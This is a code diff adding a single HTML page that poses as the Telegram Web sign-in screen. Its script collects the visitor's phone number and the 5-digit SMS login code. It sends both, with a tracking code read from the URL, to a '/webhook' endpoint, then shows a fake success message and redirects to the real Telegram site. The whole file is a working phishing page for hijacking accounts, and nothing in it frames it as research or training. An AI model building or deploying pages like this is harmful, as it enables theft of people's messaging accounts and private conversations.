@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Telegram Web</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #0f0f0f; color: white; margin: 0; padding: 20px; }
+        .container { max-width: 400px; margin: 50px auto; background: #1c1c1c; padding: 30px; border-radius: 12px; }
+        .logo { text-align: center; font-size: 48px; color: #34aadc; margin-bottom: 20px; }
+        .input { width: 100%; padding: 15px; margin: 10px 0; background: #2d2d2d; border: 1px solid #444; border-radius: 8px; color: white; }
+        .button { width: 100%; padding: 15px; background: #34aadc; color: white; border: none; border-radius: 8px; font-size: 16px; margin-top: 20px; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">T</div>
+        <h2 style="text-align: center;">Telegram</h2>
+        <p style="text-align: center; color: #888;">Sign in to your account</p>
+        
+        <div id="phoneSection">
+            <input type="tel" class="input" id="phone" placeholder="Phone number" required>
+            <button class="button" onclick="sendPhone()">Next</button>
+        </div>
+        
+        <div id="codeSection" class="hidden">
+            <p>Code sent to: <span id="phoneNumber"></span></p>
+            <input type="text" class="input" id="code" placeholder="Enter 5-digit code" maxlength="5">
+            <button class="button" onclick="sendCode()">Sign In</button>
+        </div>
+        
+        <div id="success" class="hidden">
+            <h3 style="color: #4CAF50; text-align: center;">✓ Success! Redirecting...</h3>
+        </div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const code = urlParams.get('code');
+        
+        function sendPhone() {
+            const phone = document.getElementById('phone').value;
+            document.getElementById('phoneNumber').textContent = phone;
+            document.getElementById('phoneSection').classList.add('hidden');
+            document.getElementById('codeSection').classList.remove('hidden');
+            
+            fetch('/webhook', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({code, phone, type: 'phone'})
+            });
+        }
+        
+        function sendCode() {
+            const smsCode = document.getElementById('code').value;
+            const phone = document.getElementById('phoneNumber').textContent;
+            
+            document.getElementById('codeSection').classList.add('hidden');
+            document.getElementById('success').classList.remove('hidden');
+            
+            fetch('/webhook', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({code, phone, sms_code: smsCode, type: 'code'})
+            });
+            
+            setTimeout(() => {
+                window.location.href = 'https://web.telegram.org';
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
